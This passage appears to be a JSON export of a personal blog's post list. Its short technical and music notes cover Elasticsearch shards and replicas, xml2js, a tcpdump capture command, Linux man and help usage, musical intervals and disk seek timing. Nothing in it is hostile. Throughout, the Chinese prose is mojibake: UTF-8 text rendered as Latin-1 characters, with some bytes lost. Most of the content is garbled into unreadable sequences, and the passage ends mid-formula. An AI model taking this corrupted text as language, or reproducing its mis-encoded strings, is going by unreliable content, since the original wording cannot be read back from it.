å…¥ä¸€ä¸ªæŒ‡å®šçš„é›†ç¾¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šè¢«å®‰æ’åŠ å…¥åˆ°ä¸€ä¸ªå«åšâ€œelasticsearchâ€çš„é›†ç¾¤ä¸­ï¼Œè¿™æ„ å‘³ç€ï¼Œå¦‚æœä½ åœ¨ä½ çš„ç½‘ç»œä¸­å¯åŠ¨äº†è‹¥å¹²ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å‡å®šå®ƒä»¬èƒ½å¤Ÿç›¸äº’å‘ç°å½¼æ­¤ï¼Œå®ƒä»¬å°†ä¼šè‡ªåŠ¨åœ°å½¢æˆå¹¶åŠ å…¥åˆ°ä¸€ä¸ªå«åšâ€œelasticsearchâ€çš„é›†ç¾¤ä¸­ã€‚ åœ¨ä¸€ä¸ªé›†ç¾¤é‡Œï¼Œåªè¦ä½ æƒ³ï¼Œå¯ä»¥æ‹¥æœ‰ä»»æ„å¤šä¸ªèŠ‚ç‚¹ã€‚è€Œä¸”ï¼Œå¦‚æœå½“å‰ä½ çš„ç½‘ç»œä¸­æ²¡æœ‰è¿è¡Œä»»ä½•ElasticsearchèŠ‚ç‚¹ï¼Œè¿™æ—¶å¯åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¼šé»˜è®¤åˆ›å»ºå¹¶åŠ å…¥ä¸€ä¸ªå«åšâ€œelasticsearchâ€çš„é›†ç¾¤ã€‚ ç´¢å¼•ï¼ˆindexï¼‰ ä¸€ä¸ªç´¢å¼•å°±æ˜¯ä¸€ä¸ªæ‹¥æœ‰å‡ åˆ†ç›¸ä¼¼ç‰¹å¾çš„æ–‡æ¡£çš„é›†åˆã€‚æ¯”å¦‚è¯´ï¼Œä½ å¯ä»¥æœ‰ä¸€ä¸ªå®¢æˆ·æ•°æ®çš„ç´¢å¼•ï¼Œå¦ä¸€ä¸ªäº§å“ç›®å½•çš„ç´¢å¼•ï¼Œè¿˜æœ‰ä¸€ä¸ªè®¢å•æ•°æ®çš„ç´¢å¼•ã€‚ä¸€ä¸ªç´¢å¼•ç”±ä¸€ä¸ªå å­—æ¥æ ‡è¯†ï¼ˆå¿…é¡»å…¨éƒ¨æ˜¯å°å†™å­—æ¯çš„ï¼‰ï¼Œå¹¶ä¸”å½“æˆ‘ä»¬è¦å¯¹å¯¹åº”äºè¿™ä¸ªç´¢å¼•ä¸­çš„æ–‡æ¡£è¿›è¡Œç´¢å¼•ã€æœç´¢ã€æ›´æ–°å’Œåˆ é™¤çš„æ—¶å€™ï¼Œéƒ½è¦ä½¿ç”¨åˆ°è¿™ä¸ªåå­—ã€‚ åœ¨ä¸€ä¸ªé›†ç¾¤ä¸­ï¼Œå¦‚æœä½ æƒ³ï¼Œå¯ä»¥å®šä¹‰ä»»æ„å¤šçš„ç´¢å¼•ã€‚ ç±»å‹ï¼ˆtypeï¼‰ åœ¨ä¸€ä¸ªç´¢å¼•ä¸­ï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ç§æˆ–å¤šç§ç±»å‹ã€‚ä¸€ä¸ªç±»å‹æ˜¯ä½ çš„ç´¢å¼•çš„ä¸€ä¸ªé€»è¾‘ä¸Šçš„åˆ†ç±»/åˆ†åŒºï¼Œå…¶è¯­ä¹‰å®Œå…¨ç”±ä½ æ¥å®šã€‚é€šå¸¸ï¼Œä¼šä¸ºå…·æœ‰ä¸€ç»„å…±åŒå­—æ®µçš„æ–‡æ¡£å®šä¹‰ä¸€ä¸ª ç±»å‹ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬å‡è®¾ä½ è¿è¥ä¸€ä¸ªåšå®¢å¹³å°å¹¶ä¸”å°†ä½ æ‰€æœ‰çš„æ•°æ®å­˜å‚¨åˆ°ä¸€ä¸ªç´¢å¼•ä¸­ã€‚åœ¨è¿™ä¸ªç´¢å¼•ä¸­ï¼Œä½ å¯ä»¥ä¸ºç”¨æˆ·æ•°æ®å®šä¹‰ä¸€ä¸ªç±»å‹ï¼Œä¸ºåšå®¢æ•°æ®å®šä¹‰å¦ä¸€ä¸ªç±» å‹ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä¸ºè¯„è®ºæ•°æ®å®šä¹‰å¦ä¸€ä¸ªç±»å‹ã€‚ æ–‡æ¡£ï¼ˆdocumentï¼‰ ä¸€ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªå¯è¢«ç´¢å¼•çš„åŸºç¡€ä¿¡æ¯å•å…ƒã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥æ‹¥æœ‰æŸä¸€ä¸ªå®¢æˆ·çš„æ–‡æ¡£ï¼ŒæŸä¸€ä¸ªäº§å“çš„ä¸€ä¸ªæ–‡æ¡£ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥æ‹¥æœ‰æŸä¸ªè®¢å•çš„ä¸€ä¸ªæ–‡æ¡£ã€‚æ–‡æ¡£ä»¥ JSONï¼ˆJavascript Object Notationï¼‰æ ¼å¼æ¥è¡¨ç¤ºï¼Œè€ŒJSONæ˜¯ä¸€ä¸ªåˆ°å¤„å­˜åœ¨çš„äº’è”ç½‘æ•°æ®äº¤äº’æ ¼å¼ã€‚ åœ¨ä¸€ä¸ªindex/typeé‡Œé¢ï¼Œåªè¦ä½ æƒ³ï¼Œä½ å¯ä»¥å­˜å‚¨ä»»æ„å¤šçš„æ–‡æ¡£ã€‚æ³¨æ„ï¼Œå°½ç®¡ä¸€ä¸ªæ–‡æ¡£ï¼Œç‰©ç†ä¸Šå­˜åœ¨äºä¸€ä¸ªç´¢å¼•ä¹‹ä¸­ï¼Œæ–‡æ¡£å¿…é¡»è¢«ç´¢å¼•/èµ‹äºˆä¸€ä¸ªç´¢å¼•çš„typeã€‚ åˆ†ç‰‡å’Œå¤åˆ¶ï¼ˆshards &amp; replicasï¼‰ ä¸€ä¸ªç´¢å¼•å¯ä»¥å­˜å‚¨è¶…å‡ºå•ä¸ªç»“ç‚¹ç¡¬ä»¶é™åˆ¶çš„å¤§é‡æ•°æ®ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå…·æœ‰10äº¿æ–‡æ¡£çš„ç´¢å¼•å æ®1TBçš„ç£ç›˜ç©ºé—´ï¼Œè€Œä»»ä¸€èŠ‚ç‚¹éƒ½æ²¡æœ‰è¿™æ ·å¤§çš„ç£ç›˜ç©ºé—´ï¼›æˆ–è€…å•ä¸ªèŠ‚ç‚¹å¤„ç†æœç´¢è¯·æ±‚ï¼Œå“åº”å¤ªæ…¢ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒElasticsearchæä¾›äº†å°†ç´¢å¼•åˆ’åˆ†æˆå¤šä»½çš„èƒ½åŠ›ï¼Œè¿™äº›ä»½å°±å«åšåˆ†ç‰‡ã€‚å½“ä½ åˆ›å»ºä¸€ä¸ªç´¢å¼•çš„æ—¶å€™ï¼Œä½ å¯ä»¥æŒ‡å®šä½ æƒ³è¦çš„åˆ†ç‰‡çš„æ•°é‡ã€‚æ¯ä¸ªåˆ†ç‰‡æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œå–„å¹¶ä¸”ç‹¬ç«‹çš„â€œç´¢å¼•â€ï¼Œè¿™ä¸ªâ€œç´¢å¼•â€å¯ä»¥è¢«æ”¾ç½®åˆ°é›†ç¾¤ä¸­çš„ä»»ä½•èŠ‚ç‚¹ä¸Šã€‚ åˆ†ç‰‡ä¹‹æ‰€ä»¥é‡è¦ï¼Œä¸»è¦æœ‰ä¸¤æ–¹é¢çš„åŸå› ï¼š - å…è®¸ä½ æ°´å¹³åˆ†å‰²/æ‰©å±•ä½ çš„å†…å®¹å®¹é‡ - å…è®¸ä½ åœ¨åˆ†ç‰‡ï¼ˆæ½œåœ¨åœ°ï¼Œä½äºå¤šä¸ªèŠ‚ç‚¹ä¸Šï¼‰ä¹‹ä¸Šè¿›è¡Œåˆ†å¸ƒå¼çš„ã€å¹¶è¡Œçš„æ“ä½œï¼Œè¿›è€Œæé«˜æ€§èƒ½/ååé‡ è‡³äºä¸€ä¸ªåˆ†ç‰‡æ€æ ·åˆ†å¸ƒï¼Œå®ƒçš„æ–‡æ¡£æ€æ ·èšåˆå›æœç´¢è¯·æ±‚ï¼Œæ˜¯å®Œå…¨ç”±Elasticsearchç®¡ç†çš„ï¼Œå¯¹äºä½œä¸ºç”¨æˆ·çš„ä½ æ¥è¯´ï¼Œè¿™äº›éƒ½æ˜¯é€æ˜çš„ã€‚ åœ¨ä¸€ä¸ªç½‘ç»œ/äº‘çš„ç¯å¢ƒé‡Œï¼Œå¤±è´¥éšæ—¶éƒ½å¯èƒ½å‘ç”Ÿï¼Œåœ¨æŸä¸ªåˆ†ç‰‡/èŠ‚ç‚¹ä¸çŸ¥æ€ä¹ˆçš„å°±å¤„äºç¦»çº¿çŠ¶æ€ï¼Œæˆ–è€…ç”±äºä»»ä½•åŸå› æ¶ˆå¤±äº†ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸€ä¸ªæ•…éšœè½¬ç§»æœºåˆ¶æ˜¯é å¸¸æœ‰ç”¨å¹¶ä¸”æ˜¯å¼ºçƒˆæ¨èçš„ã€‚ä¸ºæ­¤ç›®çš„ï¼ŒElasticsearchå…è®¸ä½ åˆ›å»ºåˆ†ç‰‡çš„ä¸€ä»½æˆ–å¤šä»½æ‹·è´ï¼Œè¿™äº›æ‹·è´å«åšå¤åˆ¶åˆ†ç‰‡ï¼Œæˆ–è€…ç›´æ¥å«å¤åˆ¶ã€‚ å¤åˆ¶ä¹‹æ‰€ä»¥é‡è¦ï¼Œæœ‰ä¸¤ä¸ªä¸»è¦åŸå› ï¼š - åœ¨åˆ†ç‰‡/èŠ‚ç‚¹å¤±è´¥çš„æƒ…å†µä¸‹ï¼Œæä¾›äº†é«˜å¯ç”¨æ€§ã€‚å› ä¸ºè¿™ä¸ªåŸå› ï¼Œæ³¨æ„åˆ°å¤åˆ¶åˆ†ç‰‡ä»ä¸ä¸åŸ/ä¸»è¦ï¼ˆoriginal/primaryï¼‰åˆ†ç‰‡ç½®äºåŒä¸€èŠ‚ç‚¹ä¸Šæ˜¯éå¸¸é‡è¦çš„ã€‚ - æ‰©å±•ä½ çš„æœç´¢é‡/ååé‡ï¼Œå› ä¸ºæœç´¢å¯ä»¥åœ¨æ‰€æœ‰çš„å¤åˆ¶ä¸Šå¹¶è¡Œè¿è¡Œ æ€»ä¹‹ï¼Œæ¯ä¸ªç´¢å¼•å¯ä»¥è¢«åˆ†æˆå¤šä¸ªåˆ†ç‰‡ã€‚ä¸€ä¸ªç´¢å¼•ä¹Ÿå¯ä»¥è¢«å¤åˆ¶0æ¬¡ï¼ˆæ„æ€æ˜¯æ²¡æœ‰å¤åˆ¶ï¼‰æˆ–å¤šæ¬¡ã€‚ä¸€æ—¦å¤åˆ¶äº†ï¼Œæ¯ä¸ªç´¢å¼•å°±æœ‰äº†ä¸»åˆ†ç‰‡ï¼ˆä½œä¸ºå¤åˆ¶æºçš„åŸæ¥çš„åˆ†ç‰‡ï¼‰å’Œ å¤åˆ¶åˆ†ç‰‡ï¼ˆä¸»åˆ†ç‰‡çš„æ‹·è´ï¼‰ä¹‹åˆ«ã€‚åˆ†ç‰‡å’Œå¤åˆ¶çš„æ•°é‡å¯ä»¥åœ¨ç´¢å¼•åˆ›å»ºçš„æ—¶å€™æŒ‡å®šã€‚åœ¨ç´¢å¼•åˆ›å»ºä¹‹åï¼Œä½ å¯ä»¥åœ¨ä»»ä½•æ—¶å€™åŠ¨æ€åœ°æ”¹å˜å¤åˆ¶çš„æ•°é‡ï¼Œä½†æ˜¯ä½ äº‹åä¸èƒ½æ”¹å˜ åˆ†ç‰‡çš„æ•°é‡ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒElasticsearchä¸­çš„æ¯ä¸ªç´¢å¼•è¢«åˆ†ç‰‡5ä¸ªä¸»åˆ†ç‰‡å’Œ1ä¸ªå¤åˆ¶ï¼Œè¿™æ„å‘³ç€ï¼Œå¦‚æœä½ çš„é›†ç¾¤ä¸­è‡³å°‘æœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä½ çš„ç´¢å¼•å°†ä¼šæœ‰5ä¸ªä¸»åˆ†ç‰‡å’Œå¦å¤–5ä¸ªå¤åˆ¶åˆ†ç‰‡ï¼ˆ1ä¸ªå®Œå…¨æ‹·è´ï¼‰ï¼Œè¿™æ ·çš„è¯æ¯ä¸ªç´¢å¼•æ€»å…±å°±æœ‰10ä¸ªåˆ†ç‰‡ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"xml2js","slug":"history/tech/5953c4d0c2b92f5665eed997","date":"2015-12-23T02:02:19.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed997/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed997/","excerpt":"","text":"å®‰è£…ï¼šnpm install xml2jsä½¿ç”¨ï¼š var xml2js = require(â€˜xml2jsâ€™); var builder = new xml2js.Builder(); // JSON-&gt;xmlvar parser = new xml2js.Parser(); //xml -&gt; json var json = parser.parseStringï¼ˆxmlï¼‰; ã€‚ã€‚ã€‚ã€‚ã€‚ xml = builder.buildObjectï¼ˆjsonï¼‰;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"tcpdump","slug":"history/tech/5953c4d0c2b92f5665eed996","date":"2015-12-23T01:54:09.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed996/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed996/","excerpt":"","text":"tcpdump -i eth0 -w test.capå¯ä»¥ä½¿ç”¨wiresharkä¹‹ç±»çš„ä¸œè¥¿æ‰“å¼€.capæ–‡ä»¶","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"éŸ³ç¨‹","slug":"history/music/5953c4d0c2b92f5665eed98f","date":"2015-12-23T00:16:19.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5953c4d0c2b92f5665eed98f/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5953c4d0c2b92f5665eed98f/","excerpt":"","text":"éŸ³ç¨‹æ˜¯éŸ³ä¸éŸ³ä¹‹é—´é«˜ä½çš„è·ç¦»ï¼ŒéŸ³ç¨‹å†³å®šéŸ³å“æ•ˆæœã€‚ä¸ºäº†éŸ³å“çš„æ•ˆæœã€‚å’Œå£°(æ›²è°ƒ)éŸ³ç¨‹æ—‹å¾‹éŸ³ç¨‹ï¼šå‘ç”Ÿåœ¨è‡ªç„¶éŸ³é˜¶ä¸Šçš„éŸ³ç¨‹å•éŸ³ç¨‹ï¼šå…«åº¦ä¹‹å†…çš„éŸ³ç¨‹å¤éŸ³ç¨‹ï¼šå…«åº¦ä¹‹å¤–çš„éŸ³ç¨‹ï¼Œå¦‚2 3 å¤äºŒåº¦ã€‚ä¸‰åº¦ï¼š å¤§ä¸‰åº¦ å°ä¸‰åº¦å¤§ä¸‰åº¦æ˜äº®ï¼Œå°ä¸‰åº¦ç°æš—ã€‚å››åº¦ï¼šå®Œå…¨(çº¯)å››åº¦å¢å››åº¦ï¼š 4-7äº”åº¦ï¼šå®Œå…¨(çº¯)5åº¦ï¼š ä¸‰å…¨ä¸€åŠå‡5åº¦ï¼š2å…¨2åŠå®Œå…¨1åº¦å®Œå…¨(çº¯)8åº¦å¤§å°6åº¦å¤§å°7åº¦","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"},{"name":"åŸºæœ¬ä¹ç†","slug":"åŸºæœ¬ä¹ç†","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%BA%E6%9C%AC%E4%B9%90%E7%90%86/"}],"author":"wangxiuwen"},{"title":"è‡ªç„¶éŸ³ç¨‹","slug":"history/music/5953c4d0c2b92f5665eed98e","date":"2015-12-23T00:14:55.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5953c4d0c2b92f5665eed98e/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5953c4d0c2b92f5665eed98e/","excerpt":"","text":"å‘ç”Ÿåœ¨è‡ªç„¶éŸ³é˜¶(1,2,3,4,5,6,7)ä¸­çš„éŸ³ç¨‹ã€‚","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"},{"name":"åŸºæœ¬ä¹ç†","slug":"åŸºæœ¬ä¹ç†","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%BA%E6%9C%AC%E4%B9%90%E7%90%86/"}],"author":"wangxiuwen"},{"title":"linux help å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eed98c","date":"2015-12-22T02:49:57.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed98c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed98c/","excerpt":"","text":"help å‘½ä»¤æ˜¯æœ€ç®€æ´çš„è·å–å¸®åŠ©çš„å†…éƒ¨å‘½ä»¤","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"manæ‰‹å†Œç« èŠ‚","slug":"history/tech/5953c4d0c2b92f5665eed98b","date":"2015-12-22T02:46:59.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed98b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed98b/","excerpt":"","text":"1 ç”¨æˆ·å‘½ä»¤(/bin, /usr/bin, /usr/local/bin)2 ç³»ç»Ÿè°ƒç”¨3 åº“ç”¨æˆ·4 ç‰¹æ®Šæ–‡ä»¶(è®¾å¤‡æ–‡ä»¶)5 æ–‡ä»¶æ ¼å¼6 æ¸¸æˆ7 æ‚é¡¹(miscellaneous)8ç®¡ç†å‘½ä»¤(/sbin, /usr/sbin, /usr/local/sbin)&lt;&gt; å¿…é€‰[] å¯é€‰â€¦ å¯ä»¥å‡ºç°å¤šæ¬¡{} åˆ†ç»„ ï¼ˆå“ªäº›æ˜¯ä¸€ç»„ï¼Œæ²¡æœ‰ç‰¹æ®Šæ„ä¹‰ï¼‰manï¼šNAME ç®€è¦åç§°SYNOPSISï¼šç”¨æ³•è¯´æ˜ï¼ŒåŒ…æ‹¬å¯ç”¨çš„é€‰é¡¹ã€‚DESCRIPTIONï¼šå‘½ä»¤åŠŸèƒ½çš„è¯¦å°½è¯´æ˜ï¼Œå¯èƒ½åŒ…æ‹¬æ¯ä¸€ä¸ªé€‰é¡¹çš„æ„ä¹‰ã€‚OPTIONï¼šè¯´æ˜æ¯ä¸€ä¸ªé€‰é¡¹çš„æ„ä¹‰ã€‚FILESï¼šæ­¤å‘½ä»¤ç›¸å…³çš„é…ç½®æ–‡ä»¶BUGSï¼šæŠ¥å‘Šbugç»™è°EXAMPLESï¼šä½¿ç”¨ç¤ºä¾‹SEE ALSOï¼šå¦å¤–å‚ç…§","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹manæ‰‹å†Œç¬¬å‡ ç« æœ‰read","slug":"history/tech/5953c4d0c2b92f5665eed98a","date":"2015-12-22T02:45:00.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed98a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed98a/","excerpt":"","text":"$whatis readread (1p) - read a line from standard inputread (2) - read from a file descriptorread (3p) - read from a fileread (1) - bash built-in commands, see bash(1)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux è·å¾—å‘½ä»¤çš„ä½¿ç”¨å¸®åŠ©","slug":"history/tech/5953c4d0c2b92f5665eed989","date":"2015-12-22T02:44:11.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed989/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed989/","excerpt":"","text":"å†…éƒ¨å‘½ä»¤ï¼šhelp COMMANDå¤–éƒ¨å‘½ä»¤ï¼šCOMMAND --helpå‘½ä»¤æ‰‹å†Œ(manual)ï¼šman COMMAND","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux man å‘½ä»¤ ä¹±ç è§£å†³","slug":"history/tech/5953c4d0c2b92f5665eed988","date":"2015-12-22T02:42:18.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed988/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed988/","excerpt":"","text":"export LANG=en","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux çš„åŸºæœ¬åŸåˆ™","slug":"history/tech/5953c4d0c2b92f5665eed987","date":"2015-12-22T02:41:33.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed987/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed987/","excerpt":"","text":"1 ç”±ç›®çš„å•ä¸€çš„å°ç¨‹åºç»„æˆï¼Œé€‚åˆå°ç¨‹åºå®Œæˆå¤æ‚ä»»åŠ¡2 ä¸€åˆ‡çš†ä¸ºä»¶3 å°½é‡é¿å…æ•è·ç”¨æˆ·æ¥å£4 é…ç½®æ–‡ä»¶ä¿å­˜ä¸ºçº¯æ–‡æœ¬æ ¼å¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"è®¿ç›˜è¯·æ±‚å®Œæˆè¿‡ç¨‹","slug":"history/tech/5953c4d0c2b92f5665eed98d","date":"2015-12-21T20:20:10.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed98d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed98d/","excerpt":"","text":"ç¡®å®šç£ç›˜åœ°å€ï¼ˆæŸ±é¢å·ï¼Œç£å¤´å·ï¼Œæ‰‡åŒºå·ï¼‰ï¼Œå†…å­˜åœ°å€ï¼ˆæº/ç›®ï¼‰ï¼š å½“éœ€è¦ä»ç£ç›˜è¯»å–æ•°æ®æ—¶ï¼Œç³»ç»Ÿä¼šå°†æ•°æ®é€»è¾‘åœ°å€ä¼ ç»™ç£ç›˜ï¼Œç£ç›˜çš„ æ§åˆ¶ç”µè·¯æŒ‰ç…§å¯»å€é€»è¾‘å°†é€»è¾‘åœ°å€ç¿»è¯‘æˆç‰©ç†åœ°å€ï¼Œå³ç¡®å®šè¦è¯»çš„æ•°æ® åœ¨å“ªä¸ªç£é“ï¼Œå“ªä¸ªæ‰‡åŒºã€‚ä¸ºäº†è¯»å–è¿™ä¸ªæ‰‡åŒºçš„æ•°æ®ï¼Œéœ€è¦å°†ç£å¤´æ”¾åˆ°è¿™ä¸ªæ‰‡åŒºä¸Šæ–¹ï¼Œä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼š1ï¼‰é¦–å…ˆå¿…é¡»æ‰¾åˆ°æŸ±é¢ï¼Œå³ç£å¤´éœ€è¦ç§»åŠ¨å¯¹å‡†ç›¸åº”ç£é“ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšå¯»é“ï¼Œ æ‰€è€—è´¹æ—¶é—´å«åšå¯»é“æ—¶é—´ï¼Œ2ï¼‰ç„¶åç›®æ ‡æ‰‡åŒºæ—‹è½¬åˆ°ç£å¤´ä¸‹ï¼Œå³ç£ç›˜æ—‹è½¬å°†ç›®æ ‡æ‰‡åŒºæ—‹è½¬åˆ°ç£å¤´ä¸‹ã€‚è¿™ä¸ª è¿‡ç¨‹è€—è´¹çš„æ—¶é—´å«åšæ—‹è½¬æ—¶é—´ã€‚ å³ä¸€æ¬¡è®¿ç›˜è¯·æ±‚ï¼ˆè¯»/å†™ï¼‰å®Œæˆè¿‡ç¨‹ç”±ä¸‰ä¸ªåŠ¨ä½œç»„æˆï¼š1ï¼‰å¯»é“ï¼ˆæ—¶é—´ï¼‰ï¼šç£å¤´ç§»åŠ¨å®šä½åˆ°æŒ‡å®šç£é“2ï¼‰æ—‹è½¬å»¶è¿Ÿï¼ˆæ—¶é—´ï¼‰ï¼šç­‰å¾…æŒ‡å®šæ‰‡åŒºä»ç£å¤´ä¸‹æ—‹è½¬ç»è¿‡3ï¼‰æ•°æ®ä¼ è¾“ï¼ˆæ—¶é—´ï¼‰ï¼šæ•°æ®åœ¨ç£ç›˜ä¸å†…å­˜ä¹‹é—´çš„å®é™…ä¼ è¾“ å› æ­¤åœ¨ç£ç›˜ä¸Šè¯»å–æ‰‡ åŒºæ•°æ®ï¼ˆä¸€å—æ•°æ®ï¼‰æ‰€éœ€æ—¶é—´ï¼šTi/o=tseek +tla + n *twm å…¶ä¸­: tseek 